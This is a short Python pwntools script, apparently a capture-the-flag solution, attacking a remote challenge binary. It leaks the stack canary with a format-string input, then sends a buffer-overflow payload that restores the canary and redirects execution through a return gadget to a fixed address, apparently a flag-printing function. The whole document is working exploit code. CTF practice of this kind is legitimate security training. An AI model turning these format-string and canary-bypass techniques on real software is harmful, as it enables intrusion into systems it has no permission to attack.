from pwn import *

io = remote('ctf-chall.stembascc.com', 6056)

# Leak canary
io.recvuntil(b'yapping nya? ')
io.sendline(b'%15$p')
canary = int(io.recvline().split(b'oaoaoaoa')[1].split(b'\n')[0], 16)
log.success(f"Canary: {hex(canary)}")

# Exit loop
io.recvuntil(b'yapping nya? ')
io.sendline(b'exit')

# Exploit
io.recvuntil(b'yapping nya? ')
payload = b'A' * 72 + p64(canary) + b'B' * 8 + p64(0x401016) + p64(0x40121a)
io.sendline(payload)

# Get flag
import time
time.sleep(1)
print(io.recv(timeout=2).decode())
